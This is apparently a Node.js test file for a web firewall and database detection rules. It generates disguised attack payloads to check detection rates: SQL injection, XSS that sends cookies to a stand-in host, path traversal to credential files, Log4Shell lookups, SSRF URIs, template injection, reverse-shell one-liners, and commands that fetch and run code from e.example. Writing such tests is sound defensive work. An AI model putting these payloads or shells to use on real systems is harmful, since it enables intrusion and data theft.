// 087 (Aaron, Nov 26: "think of permations of that attack so the system can catch other attacks developed in novel
// ways that exhibit similar pattens"). Attacks are generated, not listed: each family is built from its parts (a tag,
// a handler, a call; a separator, a command, a way to hide it) and then disguised by stacked encodings. Seed 1 is the
// set the rules were developed against; seed 2 is held out, never looked at while writing them: it is the real test.
// Honest requests go through the same disguises and must never be refused.
// Without TEST_DATABASE_URL the database rules (W43, W44, W45, W13b) are skipped; the firewall's run everywhere.
'use strict';

const test = require('node:test');
const assert = require('node:assert');
const crypto = require('crypto');
const fw = require('../wall/firewall');

function rng(seed) { let a = seed >>> 0; return () => { a = (a + 0x6d2b79f5) >>> 0; let t = a; t = Math.imul(t ^ (t >>> 15), t | 1); t ^= t + Math.imul(t ^ (t >>> 7), t | 61); return ((t ^ (t >>> 14)) >>> 0) / 4294967296; }; }
const pick = (r, a) => a[Math.floor(r() * a.length)];

// ---- disguises ----
const pct = (c) => '%' + c.charCodeAt(0).toString(16).padStart(2, '0');
const D = {
  none: (s) => s,
  case: (s, r) => [...s].map((c) => (r() < 0.5 ? c.toUpperCase() : c.toLowerCase())).join(''),
  url: (s, r) => [...s].map((c) => (r() < 0.4 && c.charCodeAt(0) < 128 ? pct(c) : c)).join(''),
  url2: (s, r) => [...s].map((c) => (r() < 0.4 && c.charCodeAt(0) < 128 ? '%25' + c.charCodeAt(0).toString(16).padStart(2, '0') : c)).join(''),
  allurl: (s) => [...s].map((c) => (c.charCodeAt(0) < 128 ? pct(c) : encodeURIComponent(c))).join(''),
  // An entity may leave off its ";" only where the next character can't continue the number (else it reads as a
  // different character in every browser and server: that would no longer be the attack).
  entity: (s, r) => { const a = [...s]; return a.map((c, i) => { if (r() >= 0.4) return c; const next = a[i + 1] || ''; const open = !(/[0-9a-fA-Fx;]/.test(next) || next.startsWith('&')) && r() < 0.5;
    return r() < 0.5 ? '&#' + c.charCodeAt(0) + (open ? '' : ';') : '&#x' + c.charCodeAt(0).toString(16) + ';'; }).join(''); },
  full: (s, r) => [...s].map((c) => { const n = c.charCodeAt(0); return n > 32 && n < 127 && r() < 0.5 ? String.fromCharCode(n + 0xfee0) : c; }).join(''),
  unicode: (s, r) => [...s].map((c) => (r() < 0.3 ? '%u' + c.charCodeAt(0).toString(16).padStart(4, '0') : c)).join(''),
};
const disguise = (s, r, allowed) => { let out = s; const n = 1 + Math.floor(r() * 2); for (let i = 0; i < n; i++) out = D[pick(r, allowed)](out, r); return out; };

// ---- attack families, generated from parts ----
const SPACE_SQL = [' ', '/**/', '/*x*/', '\t', '\n', '%0b', '+', '/*!*/', '(', ' '];
const fam = {
  sql(r) {
    const sp = () => pick(r, SPACE_SQL);
    const kw = (w) => (r() < 0.3 ? w.split('').join(pick(r, ['/**/', ''])) : w); // UN/**/ION: some engines strip comments first
    const shapes = [
      () => '1' + pick(r, ["'", '"', ')', "')"]) + sp() + kw(pick(r, ['or', 'OR', '||'])) + sp() + pick(r, ['1=1', "'a'='a", '2>1', 'true', "'x' like 'x", '1 in (1)', '"z"="z']),
      () => '0' + sp() + kw('union') + sp() + pick(r, ['', 'all' + sp(), 'distinct' + sp()]) + kw('select') + sp() + pick(r, ['null,null', '1,2,3', 'username,password' + sp() + 'from' + sp() + 'users', '@@version', 'table_name' + sp() + 'from' + sp() + 'information_schema.tables']),
      () => '1' + pick(r, [';', "';", '";']) + sp() + pick(r, ['drop' + sp() + 'table' + sp() + 'users', 'shutdown', "exec xp_cmdshell 'dir'", 'update users set role=1', 'delete from logs', 'insert into admins values(1)']),
      () => '1' + pick(r, ["'", '']) + sp() + pick(r, ['and', 'or', '||']) + sp() + pick(r, ['sleep(5)', 'pg_sleep(5)', 'benchmark(5000000,md5(1))', "dbms_pipe.receive_message('a',5)", 'randomblob(500000000)']),
      () => "1'" + sp() + pick(r, [';waitfor delay \'0:0:5\'--', '; waitfor time \'00:00\'']),
      () => pick(r, ["admin'--", "admin'#", "admin')--", 'admin"--']),
    ];
    return { v: pick(r, shapes)(), d: ['none', 'case', 'url', 'url2', 'entity', 'full', 'unicode'] };
  },
  xss(r) {
    const tag = pick(r, ['img', 'svg', 'body', 'video', 'audio', 'details', 'input', 'iframe', 'marquee', 'select', 'textarea', 'math', 'object', 'a', 'div', 'image', 'source', 'xss']);
    const ev = pick(r, ['onerror', 'onload', 'onfocus', 'onmouseover', 'ontoggle', 'onstart', 'onbegin', 'onanimationstart', 'onpointerenter', 'onauxclick', 'onwheel', 'onbeforeprint', 'onpageshow']);
    const call = pick(r, ['alert(1)', 'confirm`1`', 'prompt(document.domain)', 'print()', 'eval(atob`YWxlcnQoMSk`)', 'top["al"+"ert"](1)', 'fetch("//e.example?"+document.cookie)', 'location="javascript:alert(1)"']);
    const sep = pick(r, [' ', '/', '\t', '\n', '\f', '/x/']);
    const q = pick(r, ['', '"', "'", '`']);
    const shapes = [
      () => '<' + tag + sep + (r() < 0.5 ? 'src=x' + sep : '') + ev + '=' + q + call + q + '>',
      () => '<script' + pick(r, ['>', ' type="text/javascript">', '/x>', ' src=//e.example/x.js>']) + call + '</script>',
      () => pick(r, ['javascript', 'JaVaScRiPt', 'java\tscript', 'jav&#x09;ascript', 'vbscript']) + ':' + call,
      () => '<a href="' + pick(r, ['javascript:', 'data:text/html,<script>', '  javascript:']) + call + '">x</a>',
      () => '<iframe' + sep + 'srcdoc="<script>' + call + '</script>">',
      () => '{{constructor.constructor(\'' + call + '\')()}}',
    ];
    return { v: pick(r, shapes)(), d: ['none', 'case', 'url', 'url2', 'entity', 'full', 'unicode'] };
  },
  traversal(r) {
    const dots = pick(r, ['..', '%2e%2e', '%252e%252e', '.%2e', '%c0%ae%c0%ae', '..;', '%2e.', '․․']);
    const sep = pick(r, ['/', '\\', '%2f', '%5c', '%252f', '%c0%af']);
    const depth = 1 + Math.floor(r() * 6);
    const file = pick(r, ['etc/passwd', 'etc/shadow', 'windows/win.ini', 'boot.ini', 'proc/self/environ', 'etc/hosts', 'app/.env', 'web.config', 'root/.ssh/id_rsa', 'home/user/.aws/credentials']);
    return { v: (dots + sep).repeat(depth) + file, d: ['none', 'url', 'full', 'case'] };
  },
  command(r) {
    const sep = pick(r, [';', '|', '||', '&', '&&', '`', '$(', '\n', '\r\n', '%0a']);
    const cmd = pick(r, ['cat /etc/passwd', 'id', 'whoami', 'uname -a', 'curl http://e.example/x|sh', 'wget e.example/s -O-|bash', 'nc e.example 4444 -e /bin/sh',
      'ping -c 10 e.example', 'sleep 10', 'python -c "import os"', 'powershell -enc AAAA', 'ls -la /', 'echo $(cat /etc/passwd)', 'busybox wget http://e.example', 'bash -i', 'certutil -urlcache -f http://e.example/a a.exe']);
    let c = cmd;
    const way = r();
    if (way < 0.2) c = c.split(' ').join('${IFS}');
    else if (way < 0.35) c = c.replace(/^(\w)(\w)/, "$1'$2'"); // c'a't
    else if (way < 0.45) c = c.replace(/^(\w)/, '$1\\'); // c\at
    else if (way < 0.55) c = '/bin/' + c;
    else if (way < 0.62) c = '{' + c.split(' ').join(',') + '}';
    const close = sep === '`' ? '`' : sep === '$(' ? ')' : '';
    return { v: 'x' + sep + c + close, d: ['none', 'url', 'url2'] };
  },
  lookup(r) {
    const j = pick(r, ['j', '${lower:j}', '${::-j}', '${upper:j}', '${env:NaN:-j}', '${date:\'j\'}'.length ? '${::-j}' : 'j']);
    const n = pick(r, ['n', '${lower:n}', '${::-n}', '${env:x:-n}']);
    const proto = pick(r, ['ldap', 'ldaps', 'rmi', 'dns', 'iiop', 'http', 'nis', 'corba']);
    const colon = pick(r, [':', '${::-:}', '${env:x:-:}']);
    return { v: '${' + j + n + 'di' + colon + proto + '://e.example/a}', d: ['none', 'url', 'case'] };
  },
  inclusion(r) {
    return { v: pick(r, ['php://filter/convert.base64-encode/resource=index', 'expect://id', 'phar://up/x.phar', 'file:///etc/passwd', 'file://localhost/etc/hosts', 'gopher://127.0.0.1:6379/_x',
      'dict://127.0.0.1:11211/stat', 'http://169.254.169.254/latest/meta-data/', 'http://metadata.google.internal/computeMetadata/v1/', 'data://text/plain;base64,PD9w', 'zip://up.zip#x.php',
      'http://[fd00:ec2::254]/latest/', 'jar:http://e.example/x.jar!/']), d: ['none', 'url', 'url2', 'case', 'full'] };
  },
  template(r) {
    return { v: pick(r, ["{{''.__class__.__mro__[1].__subclasses__()}}", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", '${T(java.lang.Runtime).getRuntime().exec("id")}',
      "<%= system('id') %>", "#{''.class.forName('java.lang.Runtime')}", '{{self.__init__.__globals__.__builtins__}}', "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"]), d: ['none', 'url', 'case'] };
  },
};
const HONEST = (r) => pick(r, ['hello world', "O'Brien and O'Neil", 'rock & roll', 'how to select a union rep', 'price < 10 and > 5', 'C# and .NET', 'a/b/c', 'v1.2.3', 'page=2', 'sort=new',
  'the cat sat', 'search: who am i', 'I love SQL', 'email me at a@b.c', 'say "hi"', '50% off', 'R&D team', 'a=1&b=2', 'Tom & Jerry', 'select your plan', 'drop me a line', 'sleep well',
  'type script', 'more or less', 'why 1=1 is true in math', 'learn about cross-site scripting', 'what is ../ in a path', '(a) or (b)', 'café résumé', '日本語', '— dash', '#hashtag']);

function runFamilies(seed, n) {
  const r = rng(seed);
  const out = {};
  for (const name of Object.keys(fam)) {
    const misses = [];
    for (let i = 0; i < n; i++) {
      const { v, d } = fam[name](r);
      const payload = disguise(v, r, d);
      const where = pick(r, ['query', 'path', 'header', 'body', 'cookie']);
      const req = { path: '/api/x', query: 'id=1', ua: 'Mozilla/5.0', ip: '8.8.' + Math.floor(r() * 250) + '.' + Math.floor(r() * 250), headers: {} };
      if (where === 'query') req.query = 'id=' + payload;
      else if (where === 'path') req.path = '/files/' + payload;
      else if (where === 'header') req.headers['x-' + pick(r, ['token', 'forwarded-user', 'api-version'])] = payload;
      else if (where === 'cookie') req.headers.cookie = 'sid=abc; pref=' + payload;
      else req.body = JSON.stringify({ text: payload });
      const res = fw.decide(req, { since: '2026-01-01', now: Date.parse('2026-11-26') + i * 60000 });
      const caught = where === 'body' ? res.action !== 'allow' : res.action === 'block';
      if (!caught) misses.push(where + ': ' + payload.slice(0, 400));
    }
    out[name] = { n, caught: n - misses.length, misses };
  }
  return out;
}

test('WP1 the firewall catches generated permutations of every attack family, on the held-out seed (at least 97% each)', () => {
  const res = runFamilies(2, 400);
  const lines = Object.entries(res).map(([k, v]) => k + ' ' + v.caught + '/' + v.n);
  console.log('# held-out: ' + lines.join(', '));
  for (const [k, v] of Object.entries(res)) assert.ok(v.caught / v.n >= 0.97, k + ' ' + v.caught + '/' + v.n + '; first misses: ' + v.misses.slice(0, 5).join(' | '));
});

test('WP2 honest requests, under the same disguises, are never refused anywhere in the request', () => {
  const r = rng(3);
  const bad = [];
  for (let i = 0; i < 2000; i++) {
    const t = disguise(HONEST(r), r, ['none', 'case', 'url', 'url2', 'entity', 'full']);
    // As a browser sends it: a query or referer value is URL-encoded (a raw "&" would start another parameter).
    const qv = encodeURIComponent(t);
    for (const where of ['query', 'search', 'header', 'body', 'referer']) {
      const req = { path: '/api/feed', query: 'page=1', ua: 'Mozilla/5.0', ip: '8.8.4.' + (i % 250), headers: {} };
      if (where === 'query') req.query = 'title=' + qv;
      if (where === 'search') req.query = 'q=' + qv;
      if (where === 'header') req.headers['x-note'] = t;
      if (where === 'referer') req.headers.referer = 'https://www.google.com/search?q=' + qv;
      if (where === 'body') req.body = JSON.stringify({ text: t });
      // Each request in its own minute, so the rate limit (tested in WP4) isn't what this measures.
      const d = fw.decide(req, { since: '2026-01-01', now: Date.parse('2026-11-26') + (i * 5 + ['query', 'search', 'header', 'body', 'referer'].indexOf(where)) * 60000 });
      if (d.action === 'block') bad.push(where + ' ' + d.kind + ': ' + t);
    }
  }
  assert.deepStrictEqual(bad.slice(0, 10), []);
});

test('WP3 the simulation\'s own misses are now caught (Nov 26)', () => {
  const d = (o) => fw.decide(Object.assign({ path: '/', query: '', ua: 'Mozilla/5.0', ip: '8.8.8.8', headers: {} }, o), { since: '2026-01-01', badAddresses: ['2001:db8:66::/48'], now: Date.parse('2026-11-26') });
  for (const [name, o, want] of [
    ['SQL comment split', { query: 'id=1 UN/**/ION SEL/**/ECT x FROM y' }, 'block'],
    ['HTML entities', { query: 'n=&lt;script&gt;alert(1)&lt;/script&gt;' }, 'block'],
    ['full-width brackets', { query: 'n=%EF%BC%9Cscript%EF%BC%9Ealert(1)' }, 'block'],
    ['backtick command', { query: 'host=`whoami`' }, 'block'],
    ['newline command', { query: 'host=x%0Acurl http://e.example/s|sh' }, 'block'],
    ['Log4Shell in the user agent', { ua: '${jndi:ldap://e.example/a}' }, 'block'],
    ['probe with a Chrome user agent', { path: '/wp-login.php' }, 'block'],
    ['attack in a header', { headers: { referer: "https://x.example/?id=' union select 1 from users--" } }, 'block'],
    ['attack in the body', { method: 'POST', body: "{\"q\":\"1' or 1=1--\"}" }, 'flag'],
    ['Log4Shell in the body', { method: 'POST', body: '{"x":"${jndi:ldap://e.example/a}"}' }, 'block'],
    ['IPv6 on a threat list', { ip: '2001:db8:66::9' }, 'block'],
    ['IPv4-mapped IPv6 on a threat list', { ip: '::ffff:198.51.100.7' }, 'allow'],
  ]) { const got = d(o); assert.strictEqual(got.action, want, name + ' ' + JSON.stringify(got)); }
  assert.strictEqual(fw.decide({ path: '/', ip: '::ffff:198.51.100.7', ua: 'M' }, { badAddresses: ['198.51.100.0/24'], since: '2026-01-01' }).action, 'block', 'mapped address matches its IPv4 range');
});

test('WP4 floods: one network over its limit is slowed; a flood across many networks is flagged (never refused)', () => {
  const now = Date.parse('2026-11-26T10:00:00Z');
  let net = 0; for (let i = 0; i < fw.RATE_PER_MINUTE * fw.NETWORK_FACTOR + 50; i++) if (fw.decide({ path: '/', ua: 'M', ip: '5.6.7.' + (i % 250) }, { now, since: '2026-01-01' }).rule === 'W36') net++;
  assert.ok(net > 0, 'a /24 spread over its addresses');
  let flagged = 0; let refused = 0;
  for (let i = 0; i < fw.INSTANCE_ALERT + 100; i++) {
    const d = fw.decide({ path: '/', ua: 'M', ip: (10 + (i % 200)) + '.' + ((i >> 8) & 255) + '.' + (i & 255) + '.1' }, { now: now + 60000, since: '2026-01-01' });
    if (d.rule === 'W36' && d.action === 'flag') flagged++;
    if (d.action === 'block') refused++;
  }
  assert.ok(flagged > 0 && refused === 0, flagged + ' flagged, ' + refused + ' refused');
});

// ---- database rules ----
const SERVER = process.env.TEST_DATABASE_URL;
if (!SERVER) {
  if (process.env.CI) test('the permutation tests for the database rules need TEST_DATABASE_URL in CI', () => assert.fail('TEST_DATABASE_URL is not set'));
  else test('the permutation tests for the database rules', { skip: 'set TEST_DATABASE_URL to a Postgres server to run them' }, () => {});
  return;
}
const postgres = require('postgres');
const { migrate } = require('../scripts/migrate');
const NAME = 'dog_perm_' + crypto.randomBytes(4).toString('hex');
let server, su;
test.before(async () => {
  server = postgres(SERVER, { max: 1, ssl: false, onnotice: () => {} });
  await server.unsafe('create database ' + NAME);
  const u = new URL(SERVER); u.pathname = '/' + NAME;
  su = postgres(u.toString(), { max: 2, ssl: false, onnotice: () => {} });
  await migrate(su);
});
test.after(async () => { if (su) await su.end({ timeout: 5 }); if (server) { await server.unsafe('drop database if exists ' + NAME + ' with (force)'); await server.end({ timeout: 5 }); } });
const codeFlags = async (path, code) => (await su.unsafe('select app.wall_code_flags($1, $2, $3) as f', [path, code, '']))[0].f.map((x) => x.split(' ')[0]);
const textFlags = async (t) => (await su.unsafe('select app.wall_text_flags($1) as f', [t]))[0].f.map((x) => x.split(' ')[0]);

// Hide a name the ways code hides one.
function hide(r, name) {
  const q = pick(r, ["'", '"', '`']);
  const cut = 1 + Math.floor(r() * (name.length - 1));
  const ways = [
    () => q + name.slice(0, cut) + q + ' + ' + q + name.slice(cut) + q,
    () => q + [...name].map((c) => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('') + q,
    () => q + [...name].map((c) => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join('') + q,
    () => 'String.fromCharCode(' + [...name].map((c) => c.charCodeAt(0)).join(', ') + ')',
    () => 'Buffer.from(' + q + Buffer.from(name).toString('base64') + q + ", 'base64').toString()",
    () => 'atob(' + q + Buffer.from(name).toString('base64') + q + ')',
    () => '[' + [...name].map((c) => q + c + q).join(', ') + "].join('')",
    () => q + [...name].reverse().join('') + q + ".split('').reverse().join('')",
    () => 'Buffer.from(' + q + Buffer.from(name).toString('hex') + q + ", 'hex').toString()",
  ];
  return pick(r, ways)();
}
const SHELL = (r) => {
  const ip = (1 + Math.floor(r() * 220)) + '.' + Math.floor(r() * 250) + '.' + Math.floor(r() * 250) + '.' + Math.floor(r() * 250);
  const port = 1000 + Math.floor(r() * 60000);
  return pick(r, [
    () => pick(r, ['bash', 'sh', 'zsh']) + ' -i >& /dev/tcp/' + ip + '/' + port + ' 0>&1',
    () => '0<&196;exec 196<>/dev/tcp/' + ip + '/' + port + '; sh <&196 >&196 2>&196',
    () => pick(r, ['nc', 'ncat', 'netcat']) + ' ' + pick(r, ['-e', '-c', '-lvnpe']) + ' /bin/' + pick(r, ['sh', 'bash']) + ' ' + ip + ' ' + port,
    () => 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' + ip + ' ' + port + ' >/tmp/f',
    () => 'socat ' + pick(r, ['exec:', 'EXEC:', 'system:']) + "'bash -li',pty,stderr tcp:" + ip + ':' + port,
    () => "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"" + ip + '",' + port + "));os.dup2(s.fileno(),0);import pty;pty.spawn(\"sh\")'",
    () => "perl -e 'use Socket;$i=\"" + ip + '";$p=' + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));exec(\"/bin/sh -i\");'",
    () => "php -r '$sock=fsockopen(\"" + ip + '",' + port + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    () => "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('" + ip + "'," + port + ");$s=$c.GetStream();iex $x\"",
    () => "const net = require('net'), cp = require('child_process'); const c = net.connect(" + port + ", '" + ip + "', () => { const sh = cp.spawn('/bin/sh', []); c.pipe(sh.stdin); sh.stdout.pipe(c); });",
    () => 'openssl s_client -quiet -connect ' + ip + ':' + port + ' | /bin/sh',
    () => 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=' + ip + ' LPORT=' + port,
  ])();
};
const OBF = (r) => {
  const sink = pick(r, ['child_process', 'execSync', 'eval', 'spawn', 'exec']);
  return pick(r, [
    () => 'const m = require(' + hide(r, 'child_process') + '); m.' + pick(r, ['exec', 'execSync']) + '("id");',
    () => 'global[' + hide(r, 'eval') + '](payload);',
    () => 'require("child_process")[' + hide(r, pick(r, ['exec', 'execSync', 'spawn'])) + ']("id")',
    () => pick(r, ['eval', 'Function', 'new Function', 'setTimeout']) + '(' + pick(r, ['atob', 'Buffer.from', 'unescape', 'decodeURIComponent', 'String.fromCharCode']) + '(x))',
    () => "exec(base64.b64decode('" + Buffer.from('import os; os.system("id")').toString('base64') + "'))",
    () => "getattr(__import__(" + hide(r, 'os') + "), " + hide(r, 'system') + ")('id')",
    () => 'this[' + hide(r, sink) + ']()',
  ])();
};
const SPAM = (r) => {
  const topic = pick(r, ['bitcoin', 'BTC', 'ETH', 'USDT', 'crypto', 'Dogecoin', 'forex', 'casino']);
  const offer = pick(r, ['FREE', 'giveaway', 'airdrop', 'bonus', 'double your', 'you won', 'jackpot']);
  const tail = pick(r, ['Send 0.1 ' + topic + ' and get 1 back', 'guaranteed profit 30% daily', 'DM me on Telegram', 'contact me on WhatsApp', 'click now, limited time!!!', 'claim now at t.me/x']);
  let s = offer + ' ' + topic + ' ' + pick(r, ['giveaway', 'event', 'promo', '']) + '! ' + tail;
  const leet = r();
  if (leet < 0.3) s = s.replace(/e/g, '3').replace(/o/gi, '0').replace(/i/g, '1').replace(/a/g, '4');
  else if (leet < 0.45) s = s.split(' ').map((w) => (r() < 0.4 ? w.split('').join(' ') : w)).join(' ');
  else if (leet < 0.6) s = s.replace(/e/g, 'е').replace(/o/g, 'о'); // Cyrillic
  else if (leet < 0.7) s = s.split(' ').map((w) => (r() < 0.4 ? w.split('').join('.') : w)).join(' ');
  return s;
};
const ASK = (r) => pick(r, ['write', 'build', 'create', 'give me', 'generate', 'code']) + ' ' + pick(r, ['a working', 'an', 'some', 'a new']) + ' '
  + pick(r, ['exploit for CVE-2024-3094', 'ransomware payload', 'keylogger', 'reverse shell', 'credential harvester', 'phishing page for a bank', 'botnet', 'infostealer']) + pick(r, ['', ' and run it', ' against their server']);
const HONEST_CODE = ["const x = require('fs'); fs.readFileSync(p, 'utf8');", 'export const add = (a, b) => a + b;', "logger.info('started on port ' + port);", "const s = 'hello' + ' ' + 'world';",
  "const parts = ['a', 'b'].join('');", "const img = Buffer.from(data, 'base64');", "test('adds', () => assert.strictEqual(add(1, 2), 3));", "app.get('/health', (req, res) => res.send('ok'));",
  "const name = first + ' ' + last;", "socket.on('message', (m) => console.log(m));", "const rev = str.split('').reverse().join(''); // palindrome check", "const port = Number(process.env.PORT || 3000);"];
const HONEST_TEXT = ['How do bitcoin wallets work?', 'Free tier: 1,000 requests a day.', 'Fix the date rounding and add a test.', 'Our exploit researcher reviews each pull request.',
  'Claim your free account and start building.', 'We doubled the rate limit for crypto libraries.', 'Write a test for the login page.', 'How does the Wall stop reverse shells?',
  'Join our Telegram group for release notes.', 'Learn how ransomware works and how to defend against it.', 'The ETH Zurich paper on spam filters.'];

for (const [label, seed] of [['development seed', 1], ['held-out seed', 2]]) {
  test('WP5 database rules on generated permutations, ' + label + ': reverse shells (W43), hidden execution (W44), spam (W45/W45b), attack requests (W13b)', async () => {
    const r = rng(seed * 101);
    const tally = { W43: [0, 0, []], W44: [0, 0, []], W45: [0, 0, []], W13b: [0, 0, []] };
    for (let i = 0; i < 120; i++) {
      for (const [rule, gen, kind] of [['W43', SHELL, 'code'], ['W44', OBF, 'code'], ['W45', SPAM, 'text'], ['W13b', ASK, 'text']]) {
        const sample = gen(r);
        const f = kind === 'code' ? await codeFlags('src/' + pick(r, ['a.js', 'b.py', 'run.sh', 'x.ps1']), sample) : await textFlags(sample);
        const ok = rule === 'W45' ? (f.includes('W45') || f.includes('W45b')) : f.includes(rule);
        tally[rule][1]++; if (ok) tally[rule][0]++; else tally[rule][2].push(sample.slice(0, 140));
      }
    }
    console.log('# ' + label + ': ' + Object.entries(tally).map(([k, v]) => k + ' ' + v[0] + '/' + v[1]).join(', '));
    for (const [k, v] of Object.entries(tally)) assert.ok(v[0] / v[1] >= 0.97, k + ' ' + v[0] + '/' + v[1] + ': ' + v[2].slice(0, 4).join(' | '));
  });
}

test('WP6 honest code and text are not blocked by the new rules', async () => {
  const blocks = ['W43', 'W44', 'W45'];
  for (const c of HONEST_CODE) { const f = await codeFlags('src/a.js', c); assert.ok(!f.some((x) => blocks.includes(x)), c + ' -> ' + f); }
  for (const t of HONEST_TEXT) { const f = await textFlags(t); assert.ok(!f.some((x) => blocks.includes(x)), t + ' -> ' + f); }
  // In a test or fixture file, the red-team's quoted shells are flagged, not blocked.
  const [{ f }] = await su.unsafe('select app.wall_files_flags(null, $1::text::jsonb) as f', [JSON.stringify([{ filename: 'test/redteam/shells.test.js', status: 'added', changes: 1, patch: "@@\n+const s = 'bash -i >& /dev/tcp/203.0.113.5/4444 0>&1';" }])]);
  assert.ok(f.some((x) => x.startsWith('W43b')) && !f.some((x) => x.startsWith('W43 ')), JSON.stringify(f));
});
